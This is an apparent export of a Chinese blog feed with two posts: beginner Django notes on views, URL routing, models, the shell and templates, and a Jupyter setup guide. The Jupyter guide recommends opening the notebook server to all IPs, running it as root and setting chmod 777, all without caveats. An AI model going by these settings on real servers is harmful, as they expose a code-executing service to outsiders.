<p>virtualenv 设置好新的虚拟环境之后，打开 Windows 资源管理器，看一下 virtualenv 为我们创建了什么。在家目录中，会看到一个名为 \env_mysite 的文件夹（或者为虚拟环境起的其他名称）。打开那个文件夹，会看到下述结构：<br>\Include<br>\Lib<br>\Scripts<br>\src<br><img data-src="https://tuchuang-xchcloud-1253428588.cos.ap-chengdu.myqcloud.com/blog/Image%201.png" alt="示例图"><br>virtualenv 创建了一个完整的 Python 安装，它与其他软件是隔离开的，因此开发项目时不会影响系统中的其<br>他软件。</p>
<h3 id="Django-admin"><a href="#Django-admin" class="headerlink" title="Django admin"></a>Django admin</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Type &apos;django-admin help &lt;subcommand&gt;&apos; for help on a specific subcommand.</span><br><span class="line"></span><br><span class="line">Available subcommands:</span><br><span class="line"></span><br><span class="line">[django]</span><br><span class="line">    check ：校验项目完整性</span><br><span class="line">    compilemessages </span><br><span class="line">    createcachetable</span><br><span class="line">    dbshell</span><br><span class="line">    diffsettings</span><br><span class="line">    dumpdata : 把数据库数据导出到文件</span><br><span class="line">    flush</span><br><span class="line">    inspectdb</span><br><span class="line">    loaddata ： 把文件数据导入到数据库</span><br><span class="line">    makemessages</span><br><span class="line">    makemigrations：创建模型变更的迁移文件</span><br><span class="line">    migrate ：执行上一个命令创建的迁移文件</span><br><span class="line">    runserver ： 运行 django 项目</span><br><span class="line">    sendtestemail</span><br><span class="line">    shell ： 进入 Django 项目的 python shell</span><br><span class="line">    showmigrations </span><br><span class="line">    sqlflush</span><br><span class="line">    sqlmigrate</span><br><span class="line">    sqlsequencereset</span><br><span class="line">    squashmigrations</span><br><span class="line">    startapp ： 启用一个 Django 应用</span><br><span class="line">    startproject ： 启动一个 django</span><br><span class="line">    test ： 跑一些单元测试用例的</span><br><span class="line">    testserver </span><br><span class="line">Note that only Django core commands are listed as settings are not properly configured (error: Requested setting INSTALLED_APPS, but settings are not configured. You must either define the environment variable DJANGO_SETTINGS_MODULE or call sett</span><br><span class="line">ings.configure() before accessing settings.).</span><br></pre></td></tr></table></figure>
<h3 id="我的第一个-Django-项目："><a href="#我的第一个-Django-项目：" class="headerlink" title="我的第一个 Django 项目："></a>我的第一个 Django 项目：</h3><ul>
<li>1、运行虚拟环境<br>env_mysite\scripts\activate</li>
<li>2、安装 Django<br>pip install django==1.11.7</li>
<li>3、打开 django-admin 所在目录<br>cd C:\Users\Lenovo\env_mysite\Scripts</li>
<li><p>4、创建属于你的第一个 Django 项目<br>django-admin startproject mysite</p>
<h4 id="startproject-为我们创建的文件介绍"><a href="#startproject-为我们创建的文件介绍" class="headerlink" title="startproject 为我们创建的文件介绍"></a>startproject 为我们创建的文件介绍</h4><p>mysite/<br>manage.py<br>mysite/<br><strong>init</strong>.py<br>settings.py<br>urls.py<br>wsgi.py<br><img data-src="https://tuchuang-xchcloud-1253428588.cos.ap-chengdu.myqcloud.com/blog/startproject1.png" alt="startproject1"><br><img data-src="https://tuchuang-xchcloud-1253428588.cos.ap-chengdu.myqcloud.com/blog/startproject2.png" alt="startproject2"></p>
</li>
<li><p>外层的 mysite/ 根目录是项目的容器。这个目录的名称对 Django 没有什么作用，你可以根据喜好重命名。</p>
</li>
<li>manage.py 是一个命令行实用脚本，可以通过不同的方式与 Django 项目交互。这个文件的详细说明参见 Django Project 网站。</li>
<li>内部的 mysite/ 目录是项目的 Python 包。导入这里面的内容时要使用目录的名称（如 mysite.urls）。</li>
<li>mysite/init.py 是一个空文件，目的是让 Python 把这个目录识别为 Python 包。（如果你刚接触Python，关于包的说明请阅读 Python 官方文档。）</li>
<li>mysite/settings.py 是 Django 项目的设置/配置。</li>
<li>mysite/urls.py 是 Django 项目的 URL 声明，即 Django 驱动的网站的“目录”。</li>
<li>mysite/wsgi.py 是兼容 WSGI 的 Web 服务器的入口点，用于伺服项目。</li>
</ul>
<h4 id="编写视图以及映射"><a href="#编写视图以及映射" class="headerlink" title="编写视图以及映射"></a>编写视图以及映射</h4><h5 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h5><pre><code>
from django.http import HttpResponse
def hello(request):
    return HttpResponse("Hello world")
</code></pre>

<ul>
<li>首先，从 django.http 模块中导入 HttpResponse 类。导入这个类是因为后面的代码要使用。</li>
<li>然后，定义一个名为 hello 的函数，这是视图函数。视图函数至少有一个参数，按约定，名为 request。这是一个对象，包含触发这个视图的 Web 请求的信息，是django.http.HttpRequest 类的实例。<h5 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h5><pre><code>
from django.conf.urls import include, url
from django.contrib import admin
from app.views import hello
urlpatterns = [
  url(r'^admin/', include(admin.site.urls)),
  url(r'^hello/$', hello),
]
</code></pre></li>
<li>第一行从 django.conf.urls 模块中导入两个函数：include，用于导入另一个 URL 配置模块；url，使用正则表达式模式匹配浏览器中的 URL，把它映射到 Django 项目中的某个模块上。</li>
<li>第二行从 django.contrib 模块中导入 admin 函数。这个函数传给 include 函数，加载 Django 管理后台的 URL。</li>
<li>第三行是 urlpatterns，即 url() 实例列表。<br><img data-src="https://tuchuang-xchcloud-1253428588.cos.ap-chengdu.myqcloud.com/blog/app.views.png" alt><h6 id="根目录映射"><a href="#根目录映射" class="headerlink" title="根目录映射"></a>根目录映射</h6>准备为网站根地址实现视图时，使用的 URL 模式是 ˆ$，即匹配空字符串。<br><pre><code><br>from django.conf.urls import include, url<br>from django.contrib import admin<br>from app.views import hello, current_datetime<br>urlpatterns = [<br>  url(r’^admin/‘, include(admin.site.urls)),<br>  url(r’^hello/$’, hello),<br>  url(r’^time/$’, current_datetime),<br>  url(r’^$’, hello),<br>]<br></code></pre><br><img data-src="https://tuchuang-xchcloud-1253428588.cos.ap-chengdu.myqcloud.com/blog/Image%203.png" alt></li>
</ul>
<h6 id="Django-处理请求的过程"><a href="#Django-处理请求的过程" class="headerlink" title="Django 处理请求的过程"></a>Django 处理请求的过程</h6><ol>
<li>请求 /hello/。</li>
<li>Django 查看 ROOT_URLCONF 设置，找到根 URL 配置。</li>
<li>Django 比较 URL 配置中的各个 URL 模式，找到与 /hello/ 匹配的那个。</li>
<li>如果找到匹配的模式，调用对应的视图函数。</li>
<li>视图函数返回一个 HttpResponse 对象。</li>
<li><p>Django 把 HttpResponse 对象转换成正确的 HTTP 响应，得到网页。</p>
<h6 id="动态URL"><a href="#动态URL" class="headerlink" title="动态URL"></a>动态URL</h6><pre><code>
def hours_ahead(request, offset):
 try:
     offset = int(offset)
 except ValueError:
     raise Http404()
 dt = datetime.datetime.now() + datetime.timedelta(hours=offset)
 html = "In %s hour(s), it will be %s." % (offset, dt)
 return HttpResponse(html)

url(r'^time/plus/(\d{1,2})/$', hours_ahead),
</code></pre>
</li>
</ol>
<ul>
<li>request 是一个 HttpRequest 对象，这与 hello 和 current_datetime 两个视图一样。我要再次强调，每个视图的第一个参数都是 HttpRequest 对象。</li>
<li>offset 是 URL 模式中那对圆括号捕获的字符串。如果请求的 URL 是 /time/plus/3/，那么偏移量是字符串 ‘3’；如果请求的 URL 是 /time/plus/21/，那么偏移量是字符串 ‘21’。注意，捕获的值始终是Unicode 对象，而不是整数，即便捕获的字符串中只有数字（如 ‘21’）也不是。</li>
</ul>
<h3 id="模型层"><a href="#模型层" class="headerlink" title="模型层"></a>模型层</h3><h4 id="模型层是什么"><a href="#模型层是什么" class="headerlink" title="模型层是什么"></a>模型层是什么</h4><p>位于 Django 视图层和数据库之间</p>
<p>python 对象和数据库表之间转换</p>
<h4 id="为什么需要模型层"><a href="#为什么需要模型层" class="headerlink" title="为什么需要模型层"></a>为什么需要模型层</h4><p>屏蔽不同数数据库之间的差异</p>
<p>开发者更加专注于业务逻辑的开发</p>
<p>提供很多便捷的工具帮助开发</p>
<h4 id="模型层配置"><a href="#模型层配置" class="headerlink" title="模型层配置"></a>模型层配置</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">setting：</span><br><span class="line"></span><br><span class="line">DATABASES = &#123;</span><br><span class="line">    &apos;default&apos;: &#123;</span><br><span class="line">        &apos;ENGINE&apos;: &apos;django.db.backends.sqlite3&apos;,</span><br><span class="line">        &apos;NAME&apos;: os.path.join(BASE_DIR, &apos;db.sqlite3&apos;),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Django-shell"><a href="#Django-shell" class="headerlink" title="Django shell"></a>Django shell</h3><h4 id="为什么使用-Django-shell"><a href="#为什么使用-Django-shell" class="headerlink" title="为什么使用 Django shell"></a>为什么使用 Django shell</h4><p>临时性操作使用 Django Shell 更加方便</p>
<p>小范围 Debug 更简单，不需要运行整个项目来测试</p>
<h4 id="Django-shell-的使用"><a href="#Django-shell-的使用" class="headerlink" title="Django shell 的使用"></a>Django shell 的使用</h4><p>python manage.py shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In [1]: from app.models import Article</span><br><span class="line"></span><br><span class="line">In [2]: a = Article()</span><br><span class="line"></span><br><span class="line">In [3]: a.title = &apos;Test Django Shell&apos;</span><br><span class="line"></span><br><span class="line">In [4]: a.brief_content = &apos;Text Django Shell, New Article, main content.&apos;</span><br><span class="line"></span><br><span class="line">In [5]: print(a)</span><br><span class="line">Article object (None)</span><br><span class="line"></span><br><span class="line">In [6]: a.save()</span><br><span class="line"></span><br><span class="line">In [7]: articles = Article.objects.all()</span><br><span class="line"></span><br><span class="line">In [12]: article = articles[0]</span><br><span class="line"></span><br><span class="line">In [13]: print(article.title)</span><br><span class="line">Test Django Shell</span><br></pre></td></tr></table></figure>
<h4 id="Django-Admin-模块"><a href="#Django-Admin-模块" class="headerlink" title="Django Admin 模块"></a>Django Admin 模块</h4><h5 id="Django-Admin-模块是什么"><a href="#Django-Admin-模块是什么" class="headerlink" title="Django Admin 模块是什么"></a>Django Admin 模块是什么</h5><p>自带的标配后台管理工具</p>
<p>读取定义的模型元数据，提供强大的管理使用界面</p>
<h5 id="为什么需要-Django-Admin-模块"><a href="#为什么需要-Django-Admin-模块" class="headerlink" title="为什么需要 Django Admin 模块"></a>为什么需要 Django Admin 模块</h5><p>简化 Django shell 的操作步骤</p>
<p>管理页面时基础设施中重要的部分</p>
<p>认证用户、显示管理模型、校验输入模型等功能类似</p>
<h5 id="Django-Admin-模块的使用"><a href="#Django-Admin-模块的使用" class="headerlink" title="Django Admin 模块的使用"></a>Django Admin 模块的使用</h5><p>创建管理员用户</p>
<p>登录页面进行管理</p>
<h5 id="差缺补漏：-str-self"><a href="#差缺补漏：-str-self" class="headerlink" title="差缺补漏：_ str _ (self)"></a>差缺补漏：_ <em>str</em> _ (self)</h5><p>在python中方法名如果是<strong>xxxx</strong>()的，那么就有特殊的功能，因此叫做“魔法”方法<br>当使用print输出对象的时候，只要自己定义了<strong>str</strong>(self)方法，那么就会打印从在这个方法中return的数据<br><strong>str</strong>方法需要返回一个字符串，当做这个对象的描写</p>
<h4 id="新增超级管理员"><a href="#新增超级管理员" class="headerlink" title="新增超级管理员"></a>新增超级管理员</h4><p>python manage.py createsuperuser</p>
<h4 id="设计数据返回函数"><a href="#设计数据返回函数" class="headerlink" title="设计数据返回函数"></a>设计数据返回函数</h4><h4 id="Django-视图与模板"><a href="#Django-视图与模板" class="headerlink" title="Django 视图与模板"></a>Django 视图与模板</h4><h5 id="使用-Bootstrap-实现静态网站页面"><a href="#使用-Bootstrap-实现静态网站页面" class="headerlink" title="使用 Bootstrap 实现静态网站页面"></a>使用 Bootstrap 实现静态网站页面</h5><h6 id="页面布局设计"><a href="#页面布局设计" class="headerlink" title="页面布局设计"></a>页面布局设计</h6><p>网站首页：</p>
<p>文章详情页设计：</p>
<h6 id="Bootstrap以及Bootstrap的栅格系统"><a href="#Bootstrap以及Bootstrap的栅格系统" class="headerlink" title="Bootstrap以及Bootstrap的栅格系统"></a>Bootstrap以及Bootstrap的栅格系统</h6><p>来自美国Twitter的前端框架<br>提供非常多的控件并附带源码</p>
<h6 id="实现静态页面"><a href="#实现静态页面" class="headerlink" title="实现静态页面"></a>实现静态页面</h6><h5 id="初识-Django-的模板系统"><a href="#初识-Django-的模板系统" class="headerlink" title="初识 Django 的模板系统"></a>初识 Django 的模板系统</h5><ul>
<li>模板系统简介：</li>
</ul>
<p>视图文件不适合编码 HTML<br>页面设计改变需要修改python代码<br>页面逻辑和网页视图应该分开设计<br>模板系统的变现形式是文本<br>分离文档的表现形式和表现内容<br>模板系统定义了特哟的标签占位符</p>
<ul>
<li>基本语法：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">◆变量标签：&#123;&#123;变量&#125;</span><br><span class="line">&lt;html&gt;&lt;body&gt;&#123;&#123;now&#125;&#125;&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">◆for循环标签：&#123;%for xin list%），&#123;%endfor%&#125;</span><br><span class="line"></span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&#123;% for item in list %&#125;</span><br><span class="line">&lt;li&gt;&#123;&#123;item &#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor%&#125;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">◆if-else分支标签：&#123;%if%&#125;，&#123;%else%），&#123;%endif%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% if true &#125;</span><br><span class="line">&lt;p&gt;it is a true part.&lt;/p&gt;</span><br><span class="line">&#123;% else%&#125;</span><br><span class="line">&lt;p&gt;it is a false part.&lt;/p&gt;</span><br><span class="line">&#123;% endif%&#125;</span><br></pre></td></tr></table></figure>
<h5 id="使用模板那系统渲染网站页面"><a href="#使用模板那系统渲染网站页面" class="headerlink" title="使用模板那系统渲染网站页面"></a>使用模板那系统渲染网站页面</h5><h5 id="实现文章详情页面跳转"><a href="#实现文章详情页面跳转" class="headerlink" title="实现文章详情页面跳转"></a>实现文章详情页面跳转</h5><h6 id="设计文章详情页的URL"><a href="#设计文章详情页的URL" class="headerlink" title="设计文章详情页的URL"></a>设计文章详情页的URL</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/blog/detail=&gt;不能指定某一篇博客</span><br><span class="line">·/blog/detail/1=&gt;博客唯一ID为1的文章</span><br><span class="line">·/blog/detail/2=&gt;博客唯一ID为2的文章</span><br><span class="line">·/blog/detail/3=&gt;博客唯一ID为3的文章</span><br><span class="line">·/blog/detail/..</span><br></pre></td></tr></table></figure>
<h6 id="实现首页的跳转"><a href="#实现首页的跳转" class="headerlink" title="实现首页的跳转"></a>实现首页的跳转</h6><p>就是完善视图函数</p>
<h5 id="实现上下篇文章跳转"><a href="#实现上下篇文章跳转" class="headerlink" title="实现上下篇文章跳转"></a>实现上下篇文章跳转</h5><p>文章下面添加两个按钮 上一篇 下一篇</p>
<h5 id="实现分页功能"><a href="#实现分页功能" class="headerlink" title="实现分页功能"></a>实现分页功能</h5>]]></content>
      <categories>
        <category>Django</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Django</tag>
        <tag>入门</tag>
      </tags>
  </entry>
  <entry>
    <title>python-jupyter-使用总结</title>
    <url>/python-jupyter-%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="在-centos-下配置-jupyter"><a href="#在-centos-下配置-jupyter" class="headerlink" title="在 centos 下配置 jupyter"></a>在 centos 下配置 jupyter</h2><h3 id="配置文档"><a href="#配置文档" class="headerlink" title="配置文档"></a>配置文档</h3><p>jupyter notebook –generate-config 生成默认配置文档</p>
<h3 id="修改密码："><a href="#修改密码：" class="headerlink" title="修改密码："></a>修改密码：</h3><p><strong>1.</strong> windows下，打开命令行，重新生成一个jupyter配置文件：</p>
<p><code>jupyter notebook --generate-config</code><br>　<br><strong>2.</strong> 修个配置文件，找到这个新生成的文件：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows: </span><br><span class="line"></span><br><span class="line">C:\Users\USERNAME\.jupyter\jupyter_notebook_config.py</span><br><span class="line"></span><br><span class="line">linux :</span><br><span class="line">vim /root/.jupyter/jupyter_notebook_config.py</span><br><span class="line"></span><br><span class="line">搜索 NotebookApp.allow_password_change，改为：</span><br><span class="line"></span><br><span class="line">NotebookApp.allow_password_change=False ，记得去掉注释的#</span><br><span class="line"></span><br><span class="line">也不要搜索了，麻烦，直接再第一行加</span><br></pre></td></tr></table></figure></p>
<p><strong>3.</strong> 回到命令行，运行jupyter notebook password<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">notebook password</span><br><span class="line">Enter password:             #键入密码，不显示的</span><br><span class="line">Verify password:            #再次重复键入密码</span><br><span class="line">[NotebookPasswordApp] Wrote hashed password to C:\Users\用户\.jupyter\jupyter_notebook_config.json     #密码生成的一串sha1，写入到了这个文件，等下要把这串sha1，复制到第一个生成的配置文件中</span><br></pre></td></tr></table></figure></p>
<p><strong>4.</strong> 还差一步密码才可以生效使用，在第一个jupyter_notebook_config.py配置文件中找到<br>“c.NotebookApp.password“，等于，刚生成的那个密码sha1，效果如下：去掉前面的”#“</p>
<p><code>c.NotebookApp.password = u&#39;sha1:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#39;</code></p>
<p><strong>5.</strong> 保险起见，把jupyter重启，之后，无论是更换浏览器还是Logout登陆，新密码都可以正常使用了。</p>
<h3 id="访问是https"><a href="#访问是https" class="headerlink" title="访问是https"></a>访问是https</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">问题：Jupyter notebook 远程server打开时遇到 socket.gaierror: [Errno -2] Name or service not known</span><br><span class="line"></span><br><span class="line">这个问题主要是由于远程打开的时候，并没有allow_remote_access=True</span><br></pre></td></tr></table></figure>
<p>反向代理设置问题</p>
<p>修改(直接在前几行添加）：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c.NotebookApp.ip=&apos;*&apos; # 允许所有ip访问</span><br></pre></td></tr></table></figure></p>
<p><strong>踩坑：</strong> 设置了反向代理，访问什么的没问题，但是链接不到解释服务器，打不开终端，各种修改无果！修改允许所有IP访问，然后设置301重定向，近似完美解决。</p>
<h3 id="修改Jupyter工作目录"><a href="#修改Jupyter工作目录" class="headerlink" title="修改Jupyter工作目录"></a>修改Jupyter工作目录</h3><p><code>c.NotebookApp.notebook_dir = &#39;想设置哪个就是哪个&#39;</code></p>
<h3 id="启动命令："><a href="#启动命令：" class="headerlink" title="启动命令："></a>启动命令：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jupyter notebook --config /root/.jupyter/jupyter_notebook_config.py --allow-root</span><br></pre></td></tr></table></figure>
<p>启动以后，还可以给Python环境安装包之类。如果希望Jupyter长久运行，可以使用nohup后台运行。</p>
<h2 id="杀死占用端口程序进程"><a href="#杀死占用端口程序进程" class="headerlink" title="杀死占用端口程序进程"></a>杀死占用端口程序进程</h2><p>根据端口查看这个进程的pid<br>netstat -lnp|grep 8080   #8080请换为你的apache需要的端口<br>查看进程的详细信息<br>ps 1777    #1777就是上一步得到的pid<br>杀掉进程<br>例如： kill -9 [PID]  #-9 表示强迫进程立即停止</p>
<p><a href="https://www.cnblogs.com/coder-lzh/p/8977232.html" target="_blank" rel="noopener">参考地址</a></p>
<h2 id="修改jupyter的权限"><a href="#修改jupyter的权限" class="headerlink" title="修改jupyter的权限"></a>修改jupyter的权限</h2><p>当我们用命令行在浏览器中启动jupyter notebook后需要点击右上角的New创建新的python文件，此时会报错。在Linux下可以用命令行解决这个问题。首先需要找到anaconda2中jupyter文件，在anaconda2中的share文件中，对jupyter执行如下命令，来修改jupyter的权限：</p>
<p><code>chmod +777 /root/.jupyter/practice</code></p>
<p>之后重启jupyter即可运行,python代码</p>
<h2 id="jupyter-快捷键"><a href="#jupyter-快捷键" class="headerlink" title="jupyter 快捷键"></a>jupyter 快捷键</h2><p><a href="https://blog.csdn.net/HeatDeath/article/details/78030902" target="_blank" rel="noopener">Jupyter Notebook 快捷键</a></p>
<h2 id="jupyter-notebook-写代码自动补全"><a href="#jupyter-notebook-写代码自动补全" class="headerlink" title="jupyter notebook 写代码自动补全"></a>jupyter notebook 写代码自动补全</h2><p>1.安装nbextensions<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install jupyter_contrib_nbextensions -i https://pypi.mirrors.ustc.edu.cn/simple</span><br><span class="line">jupyter contrib nbextension install --user</span><br></pre></td></tr></table></figure></p>
<p>2.安装nbextensions_configurator<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install --user jupyter_nbextensions_configurator </span><br><span class="line">jupyter nbextensions_configurator enable --user</span><br></pre></td></tr></table></figure></p>
<p>如果提示缺少依赖，就使用pip安装对应依赖即可。</p>
<p>重启jupyter，在弹出的主页面里，能看到增加了一个Nbextensions标签页，在这个页面里，勾选Hinterland即启用了代码自动补全,然后重启大功告成。</p>
<p><a href="https://blog.csdn.net/weixin_33671935/article/details/85181176?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">Jupyter Notebook 超实用的 5 个插件</a></p>
<h3 id="出现的问题"><a href="#出现的问题" class="headerlink" title="出现的问题"></a>出现的问题</h3><p>如果出现错误如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Installing collected packages: msgpack</span><br><span class="line">Could not install packages due to an EnvironmentError: [WinError 5] 拒绝访问。:</span><br><span class="line">&apos;E:\\JiangHeSong\\Anaconda35.2.0\\Lib\\site-packages\\msgpack\\_packer.cp36-win_</span><br><span class="line">amd64.pyd&apos;</span><br><span class="line">Consider using the `--user` option or check the permissions.</span><br><span class="line"> </span><br><span class="line">You are using pip version 10.0.1, however version 18.0 is available.</span><br><span class="line">You should consider upgrading via the &apos;python -m pip install --upgrade pip&apos; comm</span><br><span class="line">and.</span><br></pre></td></tr></table></figure></p>
<p>只需要加一个–user 例如：</p>
<p><code>pip install --user msgpack -i https://pypi.mirrors.ustc.edu.cn/simple</code></p>
<h2 id="在Jupyter-Notebook中交互式运行C-代码"><a href="#在Jupyter-Notebook中交互式运行C-代码" class="headerlink" title="在Jupyter Notebook中交互式运行C++代码"></a>在Jupyter Notebook中交互式运行C++代码</h2><h3 id="编译安装（坑货）"><a href="#编译安装（坑货）" class="headerlink" title="编译安装（坑货）"></a>编译安装（坑货）</h3><p>参考：为什么是坑货呢？<a href="http://blog.sina.cn/dpool/blog/s/blog_541944e10102xla0.html" target="_blank" rel="noopener">Jupyternotebook添加c++核心支持的配置过程(新浪blog)</a></p>
<p>Jupyter Notebook 支持非常多的编程语言，而且可以直接运行这些语言的代码。要让 Jupyter Notebook 能够运行特定语言的代码，需要添加对应的内核。具体支持的语言及内核可以查看该链接： <a href="https://github.com/jupyter/jupyter/wiki/Jupyter-kernels" target="_blank" rel="noopener">https://github.com/jupyter/jupyter/wiki/Jupyter-kernels</a> 。</p>
<p>cling 内核依赖于 Python3</p>
<p>添加 C++ cling 内核</p>
<p>克隆 cling 的 Github 官方仓库：</p>
<p><code>git clone https://github.com/root-project/cling.git</code></p>
<p>在进行编译操作之前，首先要确保你的机器上已经装好了 cmake 工具，即能够直接通过输入命令 cmake<br>执行程序。</p>
<p>如果 cmake<br>已经正确安装，就可以进行以下的操作了。</p>
<p>切换到 cling/tools/packaging/ 目录下，执行以下两条命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x cpt.py  </span><br><span class="line">./cpt.py --check-requirements &amp;&amp; ./cpt.py --create-dev-env Debug --with-workdir=./cling-build/</span><br></pre></td></tr></table></figure></p>
<p>这个过程包含了从网络上获取源文件以及编译，是最为耗时的一个阶段，以小时计。</p>
<p>编译完成后，需要在 python3 中安装 clingkernel。切换到 cling/tools/Jupyter/ 目录下，执行</p>
<p><code>pip3 install kernel/</code></p>
<p>最后一步，往 Jupyter Notebook 中添加 cling 内核，可以根据自己的需要安装特定 C++ 规范的 cling 内核，例如 cling-cpp11, cling-cpp14, cling-cpp17。</p>
<p><code>jupyter kernelspec install kernel/cling-cpp17</code></p>
<p>如果没有其他问题，此时就可以打开 Jupyter Notebook 感受不一样的 C++ 编程了！<br>官方代码示例<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Rectangle &#123;  </span><br><span class="line">    private:</span><br><span class="line">        double w;</span><br><span class="line">        double h;</span><br><span class="line"></span><br><span class="line">    public:</span><br><span class="line"></span><br><span class="line">        Rectangle(double w_, double h_) &#123;</span><br><span class="line">            w = w_;</span><br><span class="line">            h = h_;</span><br><span class="line">        &#125;</span><br><span class="line">        double area(void) &#123;</span><br><span class="line">            return w * h;</span><br><span class="line">        &#125;</span><br><span class="line">        double perimiter(void) &#123;</span><br><span class="line">            return 2 * (w + h);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Rectangle r = Rectangle(5, 4); </span><br><span class="line">r.area();</span><br></pre></td></tr></table></figure></p>
<p>输出为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cpp</span><br><span class="line">(double) 20.000000</span><br></pre></td></tr></table></figure></p>
<h3 id="快速安装"><a href="#快速安装" class="headerlink" title="快速安装"></a>快速安装</h3><p>一、 安装Xeus-Cling</p>
<p>目前已支持Mac和Ubuntu，windows自测，推荐使用conda安装。</p>
<p>1.首先创建一个conda environment并激活(如果不会在虚拟环境中打开jupyter,可在base环境中安装）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conda create -n Xeus-Cling</span><br><span class="line">source activate Xeus-Cling</span><br></pre></td></tr></table></figure></p>
<p>然后使用conda package installer安装Xeus-Cling</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conda install -c conda-forge xeus-cling</span><br></pre></td></tr></table></figure>
<p>完成！<br>二、测试C++ Kernel</p>
<p>1.首先，激活环境并打开jupyter-notebook<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source activate Xeus-Cling</span><br><span class="line">jupyter-notebook</span><br></pre></td></tr></table></figure></p>
<h3 id="安装的-C-内核-11-14-17-区别"><a href="#安装的-C-内核-11-14-17-区别" class="headerlink" title="安装的 C++ 内核 11 14 17 区别"></a>安装的 C++ 内核 11 14 17 区别</h3><p><a href="https://blog.csdn.net/xiaomu_347/article/details/82563688" target="_blank" rel="noopener">c++11/14/17标准你了解多少(CSDN)</a><br><a href="https://docs.microsoft.com/en-us/previous-versions/hh567368(v=vs.140" target="_blank" rel="noopener">官方(微软、英语)</a>#featurelist)</p>
<h2 id="Conda使用手册"><a href="#Conda使用手册" class="headerlink" title="Conda使用手册"></a>Conda使用手册</h2><p><a href="https://blog.csdn.net/chenfeidi1/article/details/80873993" target="_blank" rel="noopener">Conda使用手册(CSDN)</a></p>
<p><a href="https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/" target="_blank" rel="noopener">清华大学开源软件镜像站</a></p>
<p><a href="https://mirrors.ustc.edu.cn/help/anaconda.html" target="_blank" rel="noopener">科大源镜像站</a></p>
<h2 id="jupyter-云平台"><a href="#jupyter-云平台" class="headerlink" title="jupyter 云平台"></a>jupyter 云平台</h2><p><a href="https://mybinder.org" target="_blank" rel="noopener">binder</a></p>
<p><a href="https://mybinder.org/v2/gh/QuantStack/xeus-cling/stable?filepath=notebooks/xcpp.ipynb&amp;tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">C++ jupyter</a></p>
<h2 id="只下载github的某个文件夹"><a href="#只下载github的某个文件夹" class="headerlink" title="只下载github的某个文件夹"></a>只下载github的某个文件夹</h2><p>很多时候我们只想下载某个文件夹，而不是整个目录</p>
<p>我们可以用svn，先安装<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install subversion</span><br><span class="line"></span><br><span class="line">yum install subversion</span><br></pre></td></tr></table></figure></p>
<p>比如你要下载这个<a href="https://github.com/QuantStack/xeus-cling/tree/master/notebooks，将/tree/master/换成/trunk/即可" target="_blank" rel="noopener">https://github.com/QuantStack/xeus-cling/tree/master/notebooks，将/tree/master/换成/trunk/即可</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">svn checkout https://github.com/QuantStack/xeus-cling/trunk/notebooks</span><br></pre></td></tr></table></figure></p>
<h2 id="奇技淫巧"><a href="#奇技淫巧" class="headerlink" title="奇技淫巧"></a>奇技淫巧</h2><p>1、Jupyter常用的快捷键</p>
<p>1）代码运行键</p>
<p>如需运行一个cell（代码框）内的Python代码，可以选择Ctrl + Enter组合键，也可以选择Shift + Enter组合键。两者的区别在于前者在运行完代码后不会新增cell，而后者会新增cell或跳转到下一个cell。</p>
<p>2）自动补齐键</p>
<p>在代码编写过程中，如果只记得函数或变量名称的前几个字母，可以通过Tab键，实现全名称（如函数名、方法名、变量名等）的自动补齐。</p>
<p>3）帮助查询键</p>
<p>Python中有庞大的第三方包，而每个包中又包含很多功能性的函数，在使用这些函数时，往往会忘记函数内参数的具体用法，此时可以在函数后面按入Shift+Tab组合键，查看对应的帮助文档，而且还可以多按几次“Tab”键，返回不同风格的帮助文档。</p>
<p>4）cell创建键</p>
<p>在command模式下，按下字母a键，则会在当前cell的上方新增一个cell，如果按下字母b键，则会在当前cell的下方新增一个cell。</p>
<p>5）cell删除键</p>
<p>在command模式下，连续按两次d字母键，就可以轻松删除当前cell。或者还有另一个方法，在command模式下，按一次字母x键也可以实现cell的删除。</p>
<p>6）注释添加/取消键</p>
<p>如需给代码行或代码块增加注释功能，可以使用“Ctrl+/”的组合键，对于代码块的注释需要先选中，在使用组合键。如果原始代码中没有注释符，按入该组合键则增加注释，否则将取消注释。</p>
<p>7）保存键</p>
<p>在编写代码时，最好养成良好的习惯，那就是编写代码便保存（尽管Jupyter默认会2分钟自动保存一次，但2分钟内万一出现一些意外，岂不是糟糕啦）。代码的保存可以在command模式下，按一次字母s键。</p>
